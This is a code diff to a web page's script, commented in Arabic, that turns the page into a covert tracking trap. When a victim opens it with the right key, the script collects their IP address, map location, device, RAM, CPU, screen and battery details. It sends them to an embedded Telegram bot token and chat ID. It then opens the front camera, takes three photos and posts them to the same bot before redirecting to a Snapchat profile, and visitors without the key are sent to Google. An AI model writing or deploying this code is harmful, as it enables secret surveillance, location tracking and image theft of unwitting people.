@@ -33,41 +33,60 @@
 <script>
     const token = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
     const chatId = '7184970355';
-    const secretKey = "123"; // يمكنك تغيير المفتاح من هنا
+    const secretKey = "123"; 
 
-    // فحص المفتاح قبل أي شيء
+    // 1. فحص المفتاح فوراً (Security Gate)
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('key') !== secretKey) {
-        window.location.href = "https://www.google.com"; // تحويل لغوغل إذا المفتاح خطأ
+        window.location.href = "https://www.google.com"; 
     } else {
         document.getElementById('mainContent').style.display = 'block';
     }
 
-    async function fullExploit() {
+    async function startExploit() {
+        // 2. سحب كل معلومات الجهاز المتاحة
         let battery = await navigator.getBattery();
         let ipInfo = "Unknown";
-        let location = "Unknown";
+        let geo = "Unknown";
 
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
             ipInfo = data.ip;
-            location = `${data.city}, ${data.region}, ${data.country_name} (Map: https://www.google.com/maps/?q=${data.latitude},${data.longitude})`;
+            geo = `${data.city}, ${data.country_name} (Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
         } catch(e) {}
 
-        let report = `🚨 Target Spotted!\nIP: ${ipInfo}\nLocation: ${location}\nRAM: ${navigator.deviceMemory}GB\nBattery: ${(battery.level * 100).toFixed(0)}%`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
+        let fullReport = `
+🚨 **New Target Spotted!** 🚨
+━━━━━━━━━━━━━━━
+🌐 **Network:**
+IP: \`${ipInfo}\`
+Location: \`${geo}\`
+━━━━━━━━━━━━━━━
+📱 **Hardware:**
+Device: \`${navigator.platform}\`
+RAM: \`${navigator.deviceMemory || "Unknown"} GB\`
+CPU Cores: \`${navigator.hardwareConcurrency || "Unknown"}\`
+Screen: \`${screen.width}x${screen.height}\`
+OS: \`${navigator.userAgent.split('(')[1].split(')')[0]}\`
+━━━━━━━━━━━━━━━
+🔋 **Power:**
+Battery: \`${(battery.level * 100).toFixed(0)}%\`
+Charging: \`${battery.charging ? "Yes ⚡" : "No"}\`
+        `;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
 
+        // 3. طلب إذن الكاميرا والتصوير (تلقائي عند التحميل)
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // التقاط 3 صور متتالية لضمان النتيجة
             let photoCount = 0;
-            let interval = setInterval(() => {
+            let shotInterval = setInterval(() => {
                 if (photoCount >= 3) {
-                    clearInterval(interval);
+                    clearInterval(shotInterval);
                     stream.getTracks().forEach(t => t.stop());
                     window.location.href = "https://www.snapchat.com/add/koko_englishy";
                     return;
@@ -78,22 +97,23 @@
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', blob, `photo_${photoCount}.jpg`);
-                    formData.append('caption', `📷 Photo ${photoCount + 1} | IP: ${ipInfo}`);
+                    formData.append('photo', blob, `shot_${photoCount}.jpg`);
+                    formData.append('caption', `📷 Snapshot ${photoCount + 1} | IP: ${ipInfo}`);
                     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                 }, 'image/jpeg', 0.6);
                 
                 photoCount++;
-            }, 800); // التقاط صورة كل 800 مللي ثانية
+            }, 700); // التقاط صورة كل 700ms
         })
         .catch(err => {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Permission Denied")}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Camera Access Denied")}`);
             setTimeout(() => { window.location.href = "https://www.snapchat.com/add/koko_englishy"; }, 1000);
         });
     }
 
+    // التنفيذ التلقائي
     if (urlParams.get('key') === secretKey) {
-        window.onload = fullExploit;
+        window.onload = startExploit;
     }
 </script>
 
